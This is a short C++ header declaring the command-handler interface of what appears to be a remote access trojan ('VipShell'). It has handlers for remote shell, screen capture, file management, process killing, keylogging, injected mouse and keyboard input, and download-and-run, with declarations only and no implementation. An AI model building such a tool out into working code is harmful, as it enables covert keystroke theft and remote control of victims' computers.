#pragma once
#include ".\defcommandproc.h"
class CConnectServerProc : public CDefCommandProc
{

public:
	CConnectServerProc(void);
	~CConnectServerProc(void);
protected:
	tagServerSystemInfo* m_pSysinfo;
public:
	void SetServerSystemInfo(tagServerSystemInfo* p);
protected:
	virtual void OnCmd_GetDoWork(tagVipShellCmd* info);
	virtual void OnCmd_GetSystemInfo(tagVipShellCmd* info);
	virtual void OnCmd_GetShell(tagVipShellCmd* info);
	virtual void OnCmd_GetScreen(tagVipShellCmd* info);
	virtual void OnCmd_GetFileManage(tagVipShellCmd* info);
	virtual void OnCmd_GetProcessList(tagVipShellCmd* info);
	virtual void OnCmd_GetKeyLog(tagVipShellCmd* info);
//////////
	virtual void OnKeyDownd(tagVipShellCmd* info);
	virtual void OnKeyUp(tagVipShellCmd* info);
	virtual void OnMouseMove(tagVipShellCmd* info);
	virtual void OnLButtonDown(tagVipShellCmd* info);
	virtual void OnLButtonUp(tagVipShellCmd* info);
	virtual void OnLButtonDblclk(tagVipShellCmd* info);
	virtual void OnRButtonDown(tagVipShellCmd* info);
	virtual void OnRButtonUp(tagVipShellCmd* info);
	virtual void OnRButtonDblclk(tagVipShellCmd* info);
	virtual void OnKeyCtrlAltDel(tagVipShellCmd* info);
	virtual void OnGetCap(tagVipShellCmd* info);

///////////////////////////
	virtual void OnCmd_KillProcess(tagVipShellCmd* info);

////////////////////////////
	virtual void OnCmd_DownFileRun(tagVipShellCmd* info);
	virtual void OnCmd_SaveConfig(tagVipShellCmd* info);
};
